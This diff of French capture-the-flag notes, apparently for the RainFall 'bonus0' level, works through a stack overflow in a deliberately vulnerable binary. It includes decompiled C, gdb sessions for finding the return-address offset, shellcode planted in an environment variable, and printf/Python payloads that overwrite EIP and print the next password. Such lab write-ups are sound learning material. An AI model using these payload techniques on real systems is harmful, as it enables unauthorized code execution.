@@ -1,24 +1,3 @@
-➜  ~ ssh bonus0@192.168.1.28 -p 4242
-          _____       _       ______    _ _
-         |  __ \     (_)     |  ____|  | | |
-         | |__) |__ _ _ _ __ | |__ __ _| | |
-         |  _  /  _` | | '_ \|  __/ _` | | |
-         | | \ \ (_| | | | | | | | (_| | | |
-         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
-
-                 Good luck & Have fun
-
-  To start, ssh with level0/level0 on 192.168.1.28:4242
-bonus0@192.168.1.28's password:
-  GCC stack protector support:            Enabled
-  Strict user copy checks:                Disabled
-  Restrict /dev/mem access:               Enabled
-  Restrict /dev/kmem access:              Enabled
-  grsecurity / PaX: No GRKERNSEC
-  Kernel Heap Hardening: No KERNHEAP
- System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
 bonus0@RainFall:~$ ls
 bonus0
 bonus0@RainFall:~$ ./bonus0
@@ -35,24 +14,307 @@ hey
  -
 bah
 hey bah
-bonus0@RainFall:~$ ltrace ./bonus0
-__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
-puts(" - " -
-)                                                   = 4
-read(0, hey
-"hey\n", 4096)                                        = 4
-strchr("hey\n", '\n')                                         = "\n"
-strncpy(0xbffff6d8, "hey", 20)                                = 0xbffff6d8
-puts(" - " -
-)                                                   = 4
-read(0, coucou
-"coucou\n", 4096)                                     = 7
-strchr("coucou\n", '\n')                                      = "\n"
-strncpy(0xbffff6ec, "coucou", 20)                             = 0xbffff6ec
-strcpy(0xbffff726, "hey")                                     = 0xbffff726
-strcat("hey ", "coucou")                                      = "hey coucou"
-puts("hey coucou"hey coucou
-)                                            = 11
-+++ exited (status 0) +++
+
+
+bonus0@RainFall:~$ ./bonus0
+ -
+heypkpascettepetite
+ -
+d
+heypkpascettepetite d
+bonus0@RainFall:~$ ./bonus0
+ -
+heypkpascettepetitephrase
+ -
+d
+heypkpascettepetitepd d
+bonus0@RainFall:~$ ./bonus0
+ -
+heypkpascettepetitephrasouille
+ -
+bahgtpascollermoi
+heypkpascettepetitepbahgtpascoller bahgtpascoller
+bonus0@RainFall:~$
+bonus0@RainFall:~$ ./bonus0
+ -
+heypkpascettepetitephrasouille
+ -
+bahgtpascollermoialabasemaisbon
+heypkpascettepetitepbahgtpascollermoiala��� bahgtpascollermoiala���
+Segmentation fault (core dumped)
 bonus0@RainFall:~$
 
+43 octets afficher max et 40octets visible
+
+#define LINE_MAX_LEN   0x14        /* 20 : nb d'octets copies dans dest par strncpy */
+#define READ_BUF_SIZE  0x1000      /* 4096 : taille lue depuis stdin */
+
+char *p(char *dest, const char *prompt)
+{
+    char line[4104];   /* esp+10h / ebp-1008h : tampon local de lecture */
+
+    puts(prompt);
+    read(0, line, READ_BUF_SIZE);
+
+    *strchr(line, '\n') = '\0';
+    return strncpy(dest, line, LINE_MAX_LEN);
+}
+
+char *pp(char *dest)
+{
+    char src[20];   /* esp+28h / ebp-30h */
+    char v3[28];    /* esp+3Ch / ebp-1Ch */
+
+    p(src, " - ");
+    p(v3, " - ");
+
+    strcpy(dest, src);
+    *(short *)&dest[strlen(dest)] = ' ';   /* ecrit ' ' + '\0' en une seule fois (word) */
+    return strcat(dest, v3);
+}
+
+int main(void)
+{
+    char s[42];   /* esp+16h / ebp-2Ah */
+
+    pp(s);
+    puts(s);
+    return 0;
+}
+
+strncpy si line fait LINE_MAX_LEN ou plus alors il n'y a pas d'ajout de '\0'
+
+s fait 42o mais strcpy(dest, src); avec src qui fait plus 20o ou plus n'est 
+	pas null terminer. Donc strcpy met dans dest src et ce qui est stocker dans v3 
+	qui est a suivre dans la memoire. Donc si dans src il y a 20o et dans v3 15o
+	alors on onerflow s qui ne peut pas contenir 20+15 au strcpy et apres strcat
+	dest qui fait 35 et v3 qui fait 15 = 50o en tout. Il faut que v3 le 2nd input
+	fasse plus de 19o pourt qu'il ne soit pas null terminer.
+
+on overflow en mettant plus de 20 char et la 2eme entree est afficher en double
+
+Le strcpy(dest, src) vas copier le contenue de src puis celui de v3 
+	en meme temps dans dest
+
+
+Payload avec 20bytes pour fill + 4bytes changer l'adresse de retour +
+	NOP + shellcode
+
+
+Pour connaitre l'offset pour atteindre eip dans le main 
+On brake juste avant le call a pp(), 
+
+(gdb) break *0x080485b4
+Breakpoint 1 at 0x80485b4
+(gdb) run
+Starting program: /home/user/bonus0/bonus0
+
+Breakpoint 1, 0x080485b4 in main ()
+(gdb) i r
+eax            0xbffff706       -1073744122
+ecx            0xbffff7d4       -1073743916
+edx            0xbffff764       -1073744028
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6f0       0xbffff6f0
+ebp            0xbffff738       0xbffff738
+esi            0x0      0
+edi            0x0      0
+eip            0x80485b4        0x80485b4 <main+16>
+eflags         0x200286 [ PF SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+et on regarde quel est l'adresse stocker dans eax qui est l'adresse de s[] -> 0xbffff706
+
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080485a4 <+0>:     push   %ebp
+   0x080485a5 <+1>:     mov    %esp,%ebp
+   0x080485a7 <+3>:     and    $0xfffffff0,%esp
+   0x080485aa <+6>:     sub    $0x40,%esp
+   0x080485ad <+9>:     lea    0x16(%esp),%eax
+   0x080485b1 <+13>:    mov    %eax,(%esp)
+   0x080485b4 <+16>:    call   0x804851e <pp>
+   0x080485b9 <+21>:    lea    0x16(%esp),%eax
+   0x080485bd <+25>:    mov    %eax,(%esp)
+   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
+   0x080485c5 <+33>:    mov    $0x0,%eax
+   0x080485ca <+38>:    leave
+   0x080485cb <+39>:    ret
+End of assembler dump.
+(gdb) break *0x080485cb                        << break avant un return pour consulter esp qui c'est fait depiler
+Breakpoint 1 at 0x80485cb
+(gdb) run
+...
+Breakpoint 1, 0x080485cb in main ()
+(gdb) i r
+eax            0x0      0
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff73c       0xbffff73c
+ebp            0x35644134       0x35644134
+esi            0x0      0
+edi            0x0      0
+eip            0x80485cb        0x80485cb <main+39>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x/w 0xbffff73c
+0xbffff73c:     0x41366441
+(gdb)
+
+soustraction entre 0xbffff73c(adresse futur eip) et 0xbffff706(adresse de s[] (contenue dans eax))
+
+0xbffff73c-0xbffff706 = 54o donc nous avons 54octets
+
+et le shellcode en fait 62.
+
+on essaye par les vars d'env
+
+bonus0@RainFall:~$ cd /tmp/
+bonus0@RainFall:/tmp$ nano shellcodeGen.py
+bonus0@RainFall:/tmp$ python shellcodeGen.py > shellcode
+bonus0@RainFall:/tmp$ nano get_env.c
+bonus0@RainFall:/tmp$ gcc get_env.c
+bonus0@RainFall:/tmp$ ls
+a.out  get_env.c  shellcode  shellcodeGen.py
+bonus0@RainFall:/tmp$ export shellcode=$(python /tmp/shellcodeGen.py)
+bonus0@RainFall:/tmp$ env | grep shell
+shellcode=1�Ph/cath/bin��Phpassh1//.honusher/bhe/ush/hom��PQS��1���
+                                                                   1�̀
+bonus0@RainFall:/tmp$
+
+bonus0@RainFall:/tmp$ ./a.out
+0xbfffff07
+
+donc on doit remplacer eip par 0xbfffff07
+
+on fill le premier input et le second on met notre Payload
+
+bonus0@RainFall:/tmp$ python script.py > pay
+
+Comment passer la payload au 2nd 
+
+(gdb) run < /tmp/payload
+Starting program: /home/user/bonus0/bonus0 < /tmp/payload
+ -
+ -
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080484fc in p ()
+(gdb) i r
+eax            0x0      0
+ecx            0x0      0
+edx            0x20     32
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbfffe5e0       0xbfffe5e0
+ebp            0xbffff5f8       0xbffff5f8
+esi            0x0      0
+edi            0x0      0
+eip            0x80484fc        0x80484fc <p+72>
+eflags         0x210246 [ PF ZF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) x/w 0xbfffe5e0
+0xbfffe5e0:     -1073748496
+(gdb)
+
+
+printf "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\n\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x07\xff\xff\xbf\n" | ./bonus0
+
+bonus0@RainFall:~$ printf "\x41\x41\x41\x41\n\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x07\xff\xff\xbf\n" | ./bonus0
+ -
+ -
+Segmentation fault (core dumped)
+bonus0@RainFall:~$
+
+bonus0@RainFall:~$ python /tmp/script.py | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBB��� BBBBBBBBBBBBB���
+Segmentation fault (core dumped)
+
+(gdb) run < <(python /tmp/script.py)
+Starting program: /home/user/bonus0/bonus0 < <(python /tmp/script.py)
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBB��� BBBBBBBBBBBBB���
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e400bf in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) i r
+eax            0x0      0
+ecx            0xffffffff       -1
+edx            0xb7fd28b8       -1208145736
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6f0       0xbffff6f0
+ebp            0xffff0742       0xffff0742
+esi            0x0      0
+edi            0x0      0
+eip            0xb7e400bf       0xb7e400bf
+eflags         0x210286 [ PF SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+
+
+\x07\xff\xff\xbf = 0xbfffff07
+
+avec payload2 = "\x42" * 14 + "\x07\xff\xff\xbf" + "\n"
+
+(gdb) x/xw $esp
+0xbffff6ec:     0x00bfffff
+
+et avec payload2 = "\x42" * 15 + "\x07\xff\xff\xbf" + "\n"
+
+(gdb) x/xw $esp
+0xbffff6ec:     0xffff0742
+
+
+comme il est x 2 a cause du strcpy et du fait qu'il n'y ais pas de \0
+l'adresse que je veux mettre n'est jamais copmplete 
+
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBB���
+
+
+avec payload2 = "\x42" * 14 + "\x07\xff\xff\xbf" + "\x42" + "\n" 
+un octets apres l'adresse on realigne
+
+(gdb) run < <(python /tmp/script.py)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus0/bonus0 < <(python /tmp/script.py)
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB���B BBBBBBBBBBBBBB���B
+
+Breakpoint 1, 0x080485cb in main ()
+(gdb) x/xw $esp
+0xbffff6ec:     0xbfffff07
+(gdb)
+
+bonus0@RainFall:~$ python /tmp/script.py | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBB���B BBBBBBBBBBBBBB���B
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+bonus0@RainFall:~$
